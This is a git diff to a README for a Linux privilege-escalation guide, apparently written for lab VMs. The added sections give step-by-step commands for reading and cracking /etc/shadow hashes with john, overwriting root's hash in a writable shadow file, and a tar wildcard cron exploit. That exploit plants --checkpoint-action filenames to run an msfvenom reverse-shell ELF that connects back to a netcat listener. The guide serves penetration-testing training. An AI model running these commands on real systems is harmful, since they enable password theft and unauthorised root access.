@@ -1,3 +1,5 @@
+
+
 ![Cover-Image](https://user-images.githubusercontent.com/95465072/214883789-1f48e8ab-9de0-4693-b0f2-94f42e433c4f.png)
 
 
@@ -12,6 +14,7 @@
  -   LAST EDITED FILES
  -  IN MEMORY PASSWORDS
  -  FIND SENSITIVE FILES
+ -  WEAK FILE PERMISSION READABLE | WRITABLE /etc/shadow
  
 3 [Exploiting SUDO](https://github.com/sujayadkesar/Linux-Privilege-Escalation#3-escalation-by--sudo)<br>
   - NOPASSWORD
@@ -102,10 +105,44 @@ $ locate password | more
 /etc/pam.d/passwd
 ```
 
+### Weak File Permissions Readable /etc/shadow
 
+The /etc/shadow file contains user password hashes and is usually readable only by the root user.
 
+you can check whether it is readable by normal user or not by the following command
 
+`ls -l /etc/shadow`
 
+View the contents of the /etc/shadow file:
+
+`cat /etc/shadow`
+
+Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.
+
+Save the root user's hash to a file called hash.txt on your Kali  VM  and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:
+
+`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
+
+Switch to the root user, using the cracked password:
+
+`su root`
+
+### Writable /etc/shadow
+
+The /etc/shadow file contains user password hashes and is usually readable only by the root user.
+
+check whether it is writable or not by the following command 
+`ls -la /etc/shadow`
+
+Generate a new password hash with a password of your choice:
+
+`mkpasswd -m sha-512 newpasswordhere`  
+
+Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.
+
+Switch to the root user, using the new password:
+
+`su root`
 
 ## 3] Escalation By  SUDO
 
@@ -194,18 +231,32 @@ uid=0(root) gid=0(root) groups=0(root)
 &nbsp;
 
 ## 5] Wildcard
+View the contents of the other cron job script:
 
-By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite easy, and that’s where the wildcard comes in handy.
+cat /usr/local/bin/compress.sh
 
-```
-# create file for exploitation
-touch pathtofile/--checkpoint=1
-touch pathtofile/--checkpoint-action=exec=sh file.sh
-echo "#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh
+Note that the tar command is being run with a wildcard (*) in your home directory.
 
-# vulnerable script
-tar cf archive.tar *
-```
+Take a look at the GTFOBins page for tar. Note that tar has command line options that let you run other commands as part of a checkpoint feature.
+
+Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
+
+Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:
+
+chmod +x /home/user/shell.elf
+
+Create these two files in /home/user:
+
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+
+When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
+
+Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
+
+nc -nvlp 4444
 &nbsp;
 
 
